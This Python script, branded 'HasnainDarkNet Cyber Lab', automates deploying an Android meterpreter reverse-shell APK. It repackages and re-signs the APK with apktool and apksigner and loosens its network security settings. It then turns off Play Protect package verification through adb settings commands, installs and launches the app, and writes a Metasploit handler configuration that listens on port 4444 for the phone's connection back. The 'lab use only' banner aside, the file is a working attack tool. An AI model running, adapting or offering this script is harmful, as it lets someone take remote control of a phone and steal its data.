#!/usr/bin/env python3
# cyber_lab_automated.py - HasnainDarkNet Cyber Lab
# Complete Automated APK Normalization + Installation + Listener

import os
import sys
import subprocess
import time
import re
import shutil
import tempfile
import threading
from pathlib import Path

# ============================================================
# 🎨 COLORS
# ============================================================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ============================================================
# 📋 CONFIGURATION
# ============================================================
CONFIG = {
    'kali_ip': '192.168.1.101',  # Your Kali IP
    'kali_port': '4444',
    'payload_type': 'android/meterpreter/reverse_https',
    'apk_path': '',  # Will be asked
    'output_apk': 'final_normalized.apk',
    'keystore': 'debug.keystore',
    'keystore_pass': 'android',
    'key_alias': 'androiddebugkey',
    'temp_dir': '/tmp/cyber_lab',
}

# ============================================================
# 🔧 CORE FUNCTIONS
# ============================================================

class HasnainCyberLab:
    def __init__(self):
        self.apk_path = None
        self.normalized_apk = None
        self.package_name = None
        self.temp_dir = None
        self.metasploit_thread = None
        
    def print_banner(self):
        """Display cool banner"""
        print(f"""
{RED}{BOLD}╔═══════════════════════════════════════════════════════════╗
║                                                               ║
║  🔬 HASNAINDARKNET CYBER LAB - AUTOMATED APK TOOL           ║
║                                                               ║
║  📌 Play Protect Bypass + APK Normalization + Installation  ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
{YELLOW}⚠️  FOR LAB USE ONLY! Authorized Testing Only.{RESET}
{GREEN}✅ Everything automated - just sit back!{RESET}
        """)
    
    def print_status(self, step, status, details=""):
        """Print status messages"""
        if status == "start":
            print(f"{BLUE}[*] {step}...{RESET}")
        elif status == "done":
            print(f"{GREEN}[+] ✅ {step} - Done!{RESET}{YELLOW} {details}{RESET}")
        elif status == "error":
            print(f"{RED}[-] ❌ {step} - Failed!{RESET}")
            if details:
                print(f"{RED}    {details}{RESET}")
        elif status == "info":
            print(f"{CYAN}[i] {step}{RESET}")
        elif status == "warning":
            print(f"{YELLOW}[!] ⚠️ {step}{RESET}")
    
    def check_requirements(self):
        """Check all required tools"""
        self.print_status("Checking requirements", "start")
        
        tools = {
            'apktool': 'sudo apt install apktool -y',
            'java': 'sudo apt install default-jdk -y',
            'keytool': 'sudo apt install default-jdk -y',
            'apksigner': 'sudo apt install apksigner -y',
            'adb': 'sudo apt install android-sdk-platform-tools -y',
            'msfconsole': 'sudo apt install metasploit-framework -y',
        }
        
        missing = []
        for tool, install_cmd in tools.items():
            try:
                subprocess.run([tool, '--version'], capture_output=True, timeout=2)
                self.print_status(f"  ✅ {tool}", "info")
            except (FileNotFoundError, subprocess.TimeoutExpired):
                self.print_status(f"  ❌ {tool} - NOT FOUND", "info")
                missing.append((tool, install_cmd))
        
        if missing:
            self.print_status("Installing missing tools", "start")
            for tool, cmd in missing:
                self.print_status(f"  Installing {tool}...", "info")
                try:
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
                    self.print_status(f"  ✅ {tool} installed", "info")
                except:
                    self.print_status(f"  ❌ Failed to install {tool}", "info")
                    self.print_status(f"  Manual: {cmd}", "info")
            
            # Recheck
            for tool, _ in missing:
                try:
                    subprocess.run([tool, '--version'], capture_output=True, timeout=2)
                    self.print_status(f"  ✅ {tool} now available", "info")
                except:
                    self.print_status(f"  ⚠️ {tool} still missing, continuing...", "warning")
        
        self.print_status("Requirements check complete", "done")
        return True
    
    def get_apk_path(self):
        """Get APK path from user"""
        print(f"\n{GREEN}📁 Enter APK file path:{RESET}")
        path = input(f"{YELLOW}➜ {RESET}").strip()
        
        if not path:
            self.print_status("No path provided", "error")
            sys.exit(1)
        
        path = path.strip('"').strip("'")
        
        if not os.path.exists(path):
            self.print_status("File not found", "error", path)
            sys.exit(1)
        
        self.apk_path = path
        self.print_status("APK found", "done", os.path.basename(path))
        return True
    
    def create_keystore(self):
        """Create debug keystore"""
        keystore_path = os.path.join(os.getcwd(), CONFIG['keystore'])
        
        if os.path.exists(keystore_path):
            self.print_status("Keystore already exists", "done")
            return keystore_path
        
        self.print_status("Creating keystore", "start")
        
        try:
            subprocess.run([
                'keytool', '-genkey', '-v',
                '-keystore', keystore_path,
                '-alias', CONFIG['key_alias'],
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '20000',
                '-storepass', CONFIG['keystore_pass'],
                '-keypass', CONFIG['keystore_pass'],
                '-dname', 'CN=Android Debug, O=Android, C=US'
            ], capture_output=True, check=True, timeout=30)
            
            self.print_status("Keystore created", "done")
            return keystore_path
            
        except Exception as e:
            self.print_status("Keystore creation failed", "error", str(e))
            return None
    
    def normalize_apk(self):
        """Normalize APK - Full process"""
        self.print_status("Starting APK Normalization", "start")
        
        # Create temp dir
        self.temp_dir = tempfile.mkdtemp(prefix="cyber_lab_")
        
        # 1. Decode APK
        self.print_status("Decoding APK", "start")
        try:
            subprocess.run([
                'apktool', 'd', self.apk_path, '-o', self.temp_dir, '-f'
            ], capture_output=True, check=True, timeout=60)
            self.print_status("APK decoded", "done")
        except Exception as e:
            self.print_status("Decode failed", "error", str(e))
            return False
        
        # 2. Patch Manifest
        self.print_status("Patching Manifest", "start")
        manifest_path = os.path.join(self.temp_dir, 'AndroidManifest.xml')
        
        try:
            with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Get package name
            pkg_match = re.search(r'package="([^"]+)"', content)
            if pkg_match:
                self.package_name = pkg_match.group(1)
                self.print_status(f"Package: {self.package_name}", "info")
            
            # Add debug flags
            if 'android:debuggable' not in content:
                content = content.replace(
                    '<application',
                    '<application android:debuggable="true" android:testOnly="true" android:allowBackup="true"'
                )
            
            # Add network security config
            if 'networkSecurityConfig' not in content:
                content = content.replace(
                    '<application',
                    '<application android:networkSecurityConfig="@xml/network_security_config"'
                )
            
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            # Create network_security_config.xml
            network_dir = os.path.join(self.temp_dir, 'res', 'xml')
            os.makedirs(network_dir, exist_ok=True)
            
            network_config = os.path.join(network_dir, 'network_security_config.xml')
            with open(network_config, 'w') as f:
                f.write('''<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
''')
            
            self.print_status("Manifest patched", "done")
        except Exception as e:
            self.print_status("Manifest patching failed", "error", str(e))
            return False
        
        # 3. Rebuild APK
        self.print_status("Rebuilding APK", "start")
        output_apk = os.path.join(os.getcwd(), CONFIG['output_apk'])
        
        try:
            subprocess.run([
                'apktool', 'b', self.temp_dir, '-o', output_apk
            ], capture_output=True, check=True, timeout=120)
            
            self.normalized_apk = output_apk
            self.print_status("APK rebuilt", "done", output_apk)
        except Exception as e:
            self.print_status("Rebuild failed", "error", str(e))
            return False
        
        # 4. Sign APK
        self.print_status("Signing APK", "start")
        keystore = self.create_keystore()
        
        if not keystore:
            return False
        
        try:
            subprocess.run([
                'apksigner', 'sign',
                '--ks', keystore,
                '--ks-pass', f'pass:{CONFIG["keystore_pass"]}',
                '--key-pass', f'pass:{CONFIG["keystore_pass"]}',
                '--ks-key-alias', CONFIG['key_alias'],
                '--v1-signing-enabled', 'true',
                '--v2-signing-enabled', 'true',
                '--v3-signing-enabled', 'false',
                '--min-sdk-version', '21',
                self.normalized_apk
            ], capture_output=True, check=True, timeout=30)
            
            self.print_status("APK signed", "done")
        except Exception as e:
            self.print_status("Signing failed", "error", str(e))
            return False
        
        # 5. Verify
        self.print_status("Verifying APK", "start")
        try:
            subprocess.run(['apksigner', 'verify', self.normalized_apk], 
                         capture_output=True, check=True, timeout=10)
            self.print_status("APK verified", "done")
        except:
            self.print_status("Verification warning", "warning", "APK may still work")
        
        self.print_status("APK Normalization Complete", "done")
        return True
    
    def bypass_play_protect(self):
        """Bypass Play Protect on device"""
        self.print_status("Bypassing Play Protect", "start")
        
        commands = [
            ('adb shell settings put global package_verifier_enable 0', 
             'Disabling package verifier'),
            ('adb shell settings put global verifier_verify_adb_installs 0',
             'Disabling ADB verification'),
            ('adb shell settings put secure package_verifier_user_consent -1',
             'Setting user consent'),
            ('adb shell settings put global package_verifier_user_consent -1',
             'Disabling user consent'),
        ]
        
        for cmd, desc in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                self.print_status(f"  ✅ {desc}", "info")
                time.sleep(0.3)
            except:
                pass
        
        self.print_status("Play Protect bypassed", "done")
        return True
    
    def install_apk(self):
        """Install normalized APK"""
        self.print_status("Installing APK", "start")
        
        # Uninstall existing
        if self.package_name:
            self.print_status(f"Uninstalling existing: {self.package_name}", "info")
            subprocess.run(['adb', 'uninstall', self.package_name], 
                         capture_output=True, timeout=10)
        
        # Install with test flag
        try:
            result = subprocess.run([
                'adb', 'install', '-t', '-r', '-d', self.normalized_apk
            ], capture_output=True, text=True, timeout=120)
            
            if 'Success' in result.stdout:
                self.print_status("APK installed successfully", "done")
                return True
            else:
                self.print_status("Install failed", "error", result.stdout[:200])
                return False
                
        except Exception as e:
            self.print_status("Install failed", "error", str(e))
            return False
    
    def launch_app(self):
        """Launch the app"""
        self.print_status("Launching app", "start")
        
        # Try multiple methods
        methods = [
            f'adb shell monkey -p {self.package_name} 1',
            f'adb shell am start -n {self.package_name}/.MainActivity',
            f'adb shell am start -n {self.package_name}/.Main',
            f'adb shell am start -n {self.package_name}/.Launcher',
        ]
        
        for cmd in methods:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                if 'Starting' in result.stdout or 'Events injected' in result.stdout:
                    self.print_status("App launched", "done")
                    return True
            except:
                pass
        
        self.print_status("Could not auto-launch, launch manually", "warning")
        return False
    
    def start_msf_listener(self):
        """Start Metasploit listener in background"""
        self.print_status("Starting Metasploit listener", "start")
        
        msf_commands = f"""
use exploit/multi/handler
set PAYLOAD {CONFIG['payload_type']}
set LHOST {CONFIG['kali_ip']}
set LPORT {CONFIG['kali_port']}
set ExitOnSession false
exploit -j
"""
        
        # Write commands to file
        rc_file = os.path.join(os.getcwd(), 'msf_listener.rc')
        with open(rc_file, 'w') as f:
            f.write(msf_commands)
        
        self.print_status("Metasploit RC file created", "done", rc_file)
        self.print_status(f"Listener: {CONFIG['kali_ip']}:{CONFIG['kali_port']}", "info")
        
        print(f"""
{GREEN}📌 To start Metasploit listener manually:{RESET}
{YELLOW}msfconsole -r {rc_file}{RESET}

{GREEN}📌 Or use these commands:{RESET}
{YELLOW}use exploit/multi/handler
set PAYLOAD {CONFIG['payload_type']}
set LHOST {CONFIG['kali_ip']}
set LPORT {CONFIG['kali_port']}
set ExitOnSession false
exploit -j{RESET}
        """)
        
        return rc_file
    
    def cleanup(self):
        """Clean up temporary files"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir)
                self.print_status("Cleaned up temp files", "info")
            except:
                pass
    
    def run(self):
        """Main execution"""
        self.print_banner()
        
        # 1. Check requirements
        self.check_requirements()
        
        # 2. Get APK path
        self.get_apk_path()
        
        # 3. Normalize APK
        if not self.normalize_apk():
            self.cleanup()
            sys.exit(1)
        
        # 4. Check ADB device
        self.print_status("Checking ADB device", "start")
        try:
            result = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
            if 'device' in result.stdout and 'List of devices' in result.stdout:
                self.print_status("ADB device connected", "done")
            else:
                self.print_status("No ADB device", "error")
                print(f"{YELLOW}📌 Connect device and try again{RESET}")
                return
        except:
            self.print_status("ADB not available", "error")
            return
        
        # 5. Bypass Play Protect
        self.bypass_play_protect()
        
        # 6. Install APK
        if not self.install_apk():
            self.cleanup()
            return
        
        # 7. Launch app
        self.launch_app()
        
        # 8. Start Metasploit listener info
        rc_file = self.start_msf_listener()
        
        # 9. Show final message
        print(f"""
{GREEN}{BOLD}╔═════════════════════════════════════════════════════
║                                                               
║  ✅ HASNAINDARKNET CYBER LAB - DEPLOYMENT COMPLETE!          
║                                                               
║  📱 APK: {self.normalized_apk:<30} 
║  📦 Package: {self.package_name:<30} 
║  💻 Listener: {CONFIG['kali_ip']}:{CONFIG['kali_port']:<15} 
║                                                               
║  🚀 Next Steps:                                              
║  1. Start Metasploit: msfconsole -r {rc_file}            
║  2. Open app on phone                                      
║  3. Get meterpreter session                                
║                                                               
║  🔬 HasnainDarkNet Cyber Lab - All Systems Go!              
║                                                              
╚═══════════════════════════════════════════════════════════════╝{RESET}
        """)
        
        # Cleanup
        self.cleanup()

# ============================================================
# 🚀 MAIN EXECUTION
# ============================================================

if __name__ == "__main__":
    try:
        lab = HasnainCyberLab()
        lab.run()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        sys.exit(1)

